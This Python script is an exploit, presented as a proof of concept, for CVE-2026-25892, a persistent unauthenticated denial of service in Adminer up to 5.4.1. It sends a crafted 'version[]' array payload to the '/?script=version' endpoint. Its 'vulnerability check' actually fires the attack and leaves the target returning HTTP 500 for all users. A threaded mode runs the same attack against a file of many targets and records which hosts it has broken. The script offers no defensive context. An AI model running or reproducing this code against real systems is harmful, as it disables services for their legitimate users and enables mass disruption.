#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║  CVE-2026-25892 - Adminer Unauthenticated Persistent DoS Exploit              ║
║  DZ Mind Injector - PoC                                          ║
║                                                                               ║
║  Vulnerability: Adminer <= 5.4.1 - Unauthenticated Persistent DoS via        ║
║  Type Confusion in Version Endpoint                                           ║
║  CWE-20: Improper Input Validation                                            ║
║  CVSS 3.1: 7.5 (HIGH)                                                         ║
╚═══════════════════════════════════════════════════════════════════════════════╝

Description:
    This exploit targets the version endpoint in Adminer <= 5.4.1. By sending
    a crafted POST request with version[] (array) instead of version (string),
    PHP's type juggling causes openssl_verify() to receive an array, triggering
    a TypeError that results in persistent HTTP 500 errors for all users.

Target Format:
    The target should be the base URL where Adminer is installed.

    CORRECT Examples:
    - http://target.com/adminer
    - https://target.com:8080/adminer
    - http://10.10.10.10/adminer.php
    - http://target.com/tools/adminer

    INCORRECT Examples:
    - http://target.com (missing Adminer path)
    - http://target.com/ (trailing slash with no path)

    The script will automatically append the exploit path `/?script=version`
"""

import requests
import argparse
import threading
import time
import sys
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI Colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def banner():
    """DZ Mind Injector Animated Banner"""
    banner_text = f"""
{Colors.CYAN}{Colors.BOLD}
██████╗ ███████╗    ███╗   ███╗██╗███╗   ██╗██████╗     ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗ ██████╗ ██████╗ 
██╔══██╗╚══███╔╝    ████╗ ████║██║████╗  ██║██╔══██╗    ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
██║  ██║  ███╔╝     ██╔████╔██║██║██╔██╗ ██║██║  ██║    ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║   ██║██████╔╝
██║  ██║ ███╔╝      ██║╚██╔╝██║██║██║╚██╗██║██║  ██║    ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║   ██║██╔══██╗
██████╔╝███████╗    ██║ ╚═╝ ██║██║██║ ╚████║██████╔╝    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║
╚═════╝ ╚══════╝    ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝     ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                                                                                                       
                           {Colors.RED}INJECTOR{Colors.CYAN}                                
                                                                       
      {Colors.YELLOW}CVE-2026-25892{Colors.CYAN} - Adminer DoS Exploit                        
      {Colors.GREEN}Author: Dz MinD Injector | https://github.com/dzmind2312 {Colors.CYAN}                    

{Colors.END}
    """
    print(banner_text)

def animate_status(message, stop_event):
    """Animation for ongoing processes"""
    animation = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    idx = 0
    while not stop_event.is_set():
        print(f"\r{Colors.CYAN}[{animation[idx]}] {message}{Colors.END}", end='', flush=True)
        idx = (idx + 1) % len(animation)
        time.sleep(0.1)
    print(f"\r{' ' * (len(message) + 10)}", end='')

def validate_target(target):
    """Validate and normalize target URL"""
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    parsed = urlparse(target)
    if not parsed.path:
        print(f"{Colors.RED}[!] Warning: No path specified. Assuming Adminer at root.{Colors.END}")
        print(f"{Colors.YELLOW}[*] If Adminer is at /adminer, use: -u '{target}/adminer'{Colors.END}")

    # Remove trailing slash for consistency
    target = target.rstrip('/')
    return target

def check_vulnerability(target, verbose=False, timeout=10):
    """
    Check if target is vulnerable to CVE-2026-25892

    Strategy:
    1. First check if Adminer is present
    2. Then attempt the DoS payload
    3. Verify the persistent error
    """
    session = requests.Session()
    session.verify = False
    session.timeout = timeout

    exploit_path = f"{target}/?script=version"

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }

    # Payload: version[] creates array, causing type confusion
    payload = {'version[]': '5.0.0'}

    try:
        if verbose:
            print(f"{Colors.BLUE}[*] Testing target: {target}{Colors.END}")

        # Step 1: Verify Adminer exists
        base_check = session.get(target, headers=headers, allow_redirects=True)
        if 'Adminer' not in base_check.text and base_check.status_code != 200:
            return False, "Adminer not detected at this path"

        if verbose:
            print(f"{Colors.GREEN}[+] Adminer found{Colors.END}")
            print(f"{Colors.YELLOW}[*] Sending exploit payload...{Colors.END}")

        # Step 2: Send exploit payload
        response = session.post(
            exploit_path,
            data=payload,
            headers=headers,
            allow_redirects=True
        )

        if verbose:
            print(f"{Colors.BLUE}[*] Response code: {response.status_code}{Colors.END}")
            print(f"{Colors.BLUE}[*] Payload sent successfully{Colors.END}")

        # Step 3: Verify the DoS is persistent
        time.sleep(0.5)  # Small delay for processing
        verify_response = session.get(target, headers=headers, allow_redirects=True)

        if verify_response.status_code == 500:
            return True, "Target is VULNERABLE - Persistent DoS achieved"
        elif 'TypeError' in verify_response.text or 'openssl_verify' in verify_response.text:
            return True, "Target is VULNERABLE - Error signature detected"
        else:
            return False, f"Target appears patched or not vulnerable (Status: {verify_response.status_code})"

    except requests.exceptions.ConnectionError:
        return False, "Connection failed - Target unreachable"
    except requests.exceptions.Timeout:
        return False, "Connection timeout"
    except Exception as e:
        return False, f"Error: {str(e)}"

def exploit_single(target, verbose=False):
    """Exploit a single target"""
    target = validate_target(target)

    print(f"{Colors.CYAN}[*] Target: {target}{Colors.END}")

    is_vuln, message = check_vulnerability(target, verbose)

    if is_vuln:
        print(f"{Colors.GREEN}[VULNERABLE] {message}{Colors.END}")
        return True
    else:
        print(f"{Colors.RED}[NOT VULNERABLE] {message}{Colors.END}")
        return False

def exploit_multi(targets_file, threads, verbose):
    """Exploit multiple targets from file"""
    try:
        with open(targets_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Colors.RED}[!] File not found: {targets_file}{Colors.END}")
        sys.exit(1)

    print(f"{Colors.CYAN}[*] Loaded {len(targets)} targets{Colors.END}")
    print(f"{Colors.CYAN}[*] Using {threads} threads{Colors.END}\n")

    vulnerable = []
    not_vulnerable = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_target = {
            executor.submit(check_vulnerability, validate_target(t), verbose): t 
            for t in targets
        }

        for future in as_completed(future_to_target):
            target = future_to_target[future]
            try:
                is_vuln, message = future.result()
                if is_vuln:
                    print(f"{Colors.GREEN}[VULNERABLE]{Colors.END} {target}")
                    vulnerable.append(target)
                else:
                    print(f"{Colors.RED}[NOT VULNERABLE]{Colors.END} {target} - {message}")
                    not_vulnerable.append(target)
            except Exception as e:
                print(f"{Colors.RED}[ERROR]{Colors.END} {target} - {str(e)}")

    # Summary
    print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
    print(f"{Colors.GREEN}[+] Vulnerable: {len(vulnerable)}{Colors.END}")
    print(f"{Colors.RED}[-] Not Vulnerable: {len(not_vulnerable)}{Colors.END}")

    if vulnerable:
        print(f"\n{Colors.CYAN}[*] Vulnerable targets saved to: vulnerable.txt{Colors.END}")
        with open('vulnerable.txt', 'w') as f:
            for t in vulnerable:
                f.write(t + '\n')

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2026-25892 - Adminer Unauthenticated DoS Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single target (Adminer at /adminer path)
  python3 cve_2026_25892.py -u http://target.com/adminer

  # Single target with verbose output
  python3 cve_2026_25892.py -u http://target.com/adminer -v

  # Multiple targets with threading
  python3 cve_2026_25892.py -f targets.txt -t 50

  # Full path specified (Adminer as PHP file)
  python3 cve_2026_25892.py -u http://target.com/adminer.php -v

Target Format:
  - Specify the FULL path to Adminer
  - Correct: http://target.com/adminer, http://target.com/tools/adminer.php
  - Incorrect: http://target.com, http://target.com/
        """
    )

    parser.add_argument('-u', '--url', 
                        help='Single target URL (e.g., http://target.com/adminer)')
    parser.add_argument('-f', '--file', 
                        help='File containing multiple targets (one per line)')
    parser.add_argument('-t', '--threads', type=int, default=10,
                        help='Number of threads (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output')
    parser.add_argument('--timeout', type=int, default=10,
                        help='Request timeout in seconds (default: 10)')

    args = parser.parse_args()

    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)

    banner()

    if args.url:
        exploit_single(args.url, args.verbose)
    elif args.file:
        exploit_multi(args.file, args.threads, args.verbose)

if __name__ == '__main__':
    main()
